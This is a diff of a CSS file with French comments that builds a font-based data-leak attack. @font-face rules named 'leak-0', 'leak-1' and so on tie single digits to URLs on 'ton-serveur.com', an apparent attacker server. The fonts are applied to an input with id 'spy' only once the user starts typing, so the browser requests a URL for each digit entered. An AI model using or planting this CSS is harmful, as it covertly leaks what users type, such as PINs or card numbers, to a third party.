@@ -1,70 +1,24 @@
-/* style.css */
-
-/* Configuration pour chaque chiffre */
+/* 1. On définit les polices normalement */
 @font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0030; /* Chiffre 0 */
+  font-family: 'leak-0';
+  src: url("https://ton-serveur.com/0");
+  unicode-range: U+0030;
 }
-
 @font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0031; /* Chiffre 1 */
+  font-family: 'leak-1';
+  src: url("https://ton-serveur.com/1");
+  unicode-range: U+0031;
 }
+/* ... répète pour les autres chiffres ... */
 
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0032; /* Chiffre 2 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0033; /* Chiffre 3 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0034; /* Chiffre 4 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0035; /* Chiffre 5 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0036; /* Chiffre 6 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0037; /* Chiffre 7 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0038; /* Chiffre 8 */
-}
-
-@font-face {
-    font-family: 'leak';
-    src: url("https://ton-serveur.com");
-    unicode-range: U+0039; /* Chiffre 9 */
-}
-
-/* On applique la police à l'input */
+/* 2. L'ASTUCE : On cache la police derrière un état */
+/* On dit au navigateur d'utiliser une police banale par défaut */
 #spy {
-    /* 'leak' sera interrogée en premier, puis le texte s'affichera normalement en Arial */
-    font-family: 'leak', Arial, sans-serif !important;
-    font-size: 24px;
-    padding: 10px;
+  font-family: sans-serif; 
+}
+
+/* 3. On déclenche la police UNIQUEMENT quand le placeholder disparaît 
+      (donc quand l'utilisateur commence à taper) */
+#spy:not(:placeholder-shown) {
+  font-family: 'leak-0', 'leak-1', 'leak-2', sans-serif !important;
 }
